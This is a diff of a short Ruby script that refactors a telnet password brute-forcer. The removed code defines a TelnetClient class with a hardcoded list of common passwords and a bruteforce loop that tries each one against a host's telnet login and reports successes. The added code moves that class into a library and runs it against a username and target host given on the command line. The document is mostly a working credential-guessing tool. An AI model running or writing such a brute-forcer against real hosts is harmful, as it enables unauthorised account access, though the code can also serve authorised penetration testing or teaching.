@@ -1,43 +1,17 @@
 #!/usr/bin/env ruby
 
-require 'net/telnet'
+$:.unshift File.expand_path("../lib")
+require 'telnet_client'
 
-class TelnetClient
-	attr_accessor :user, :pass, :host
-	attr_accessor :target, :good
-	attr_accessor :passlist
+user = ARGV[0]
+host = ARGV[1]
 
-	def initialize(opts={})
-		@user = opts[:user] || "testuser"
-		@pass = opts[:pass] || "testpass"
-		@host = opts[:host] || "localhost"
-		@passlist = opts[:passlist] || %w{test password1 letmein! test123 qwerty monkey changeme}
-		unless @passlist.kind_of? Array
-			raise ArgumentError, "Passlist needs to be an Array"
-		end
-	end
-
-	def connect
-		@target.close rescue nil
-		puts "Trying %s:%s@%s" % [@user, @pass, @host]
-		@target = Net::Telnet::new( "Host" => @host, "Timeout" => 3)
-		begin
-			@target.login(@user, @pass)
-			@good = true
-		rescue
-			@good = false
-		end
-	end
-
-	def bruteforce
-		tries = 0
-		max = @passlist.size
-		puts "Trying #{max} passwords..."
-		@passlist.each do |pw|
-			@pass = pw
-			puts "*** Success: #{@user}:#{@pass}" if connect
-			tries += 1
-		end
-	end
-
+unless ARGV[1]
+	puts "Usage: #{$0} username targethost"
+	exit 1
 end
+
+tc = TelnetClient.new(:timeout => 1)
+tc.host = host
+tc.user = user
+tc.bruteforce
